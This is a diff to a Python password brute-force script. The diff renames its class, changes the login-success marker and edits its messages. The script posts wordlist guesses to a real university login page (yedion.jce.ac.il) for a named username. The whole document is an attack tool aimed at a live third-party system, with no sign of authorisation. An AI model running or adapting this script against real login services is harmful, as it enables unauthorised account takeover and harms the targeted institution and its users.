@@ -6,7 +6,7 @@ import sys
 import threading
 import time
 
-SUCCESS = 'Here we write the payload of successful connection'
+SUCCESS = "200" ## need to use burpsuit to find the correct answer in success method
 TARGET = "https://yedion.jce.ac.il/yedion/fireflyweb.aspx?prgname=login"
 WORDLIST = './Testing_Features/passwords.txt'
 
@@ -29,7 +29,7 @@ def get_params(content):
     return params
 
 
-class Bruter:
+class http_brute_force:
     def __init__(self, username, url):
         self.username = username
         self.url = url
@@ -51,14 +51,14 @@ class Bruter:
             print(f'Trying username/password {self.username}/{passwd:<10}')
             params['pwd'] = passwd
             resp1 = session.post(self.url, data=params)
+            #print(resp1.content)
             if SUCCESS in resp1.content.decode():
                 self.found = True
-                print(f"\nBruteforcing successful.")
+                print(f"\n Successfull Brute Force")
                 print("Username is %s" % self.username)
                 #print("Password is %s\n" % brute)
-                print('done: now cleaning up other threads. . .')
 
 if __name__ == '__main__':
     words = get_words()
-    b = Bruter('eliar', TARGET)
+    b = http_brute_force('eliar', TARGET)
     b.run_bruteforce(words)
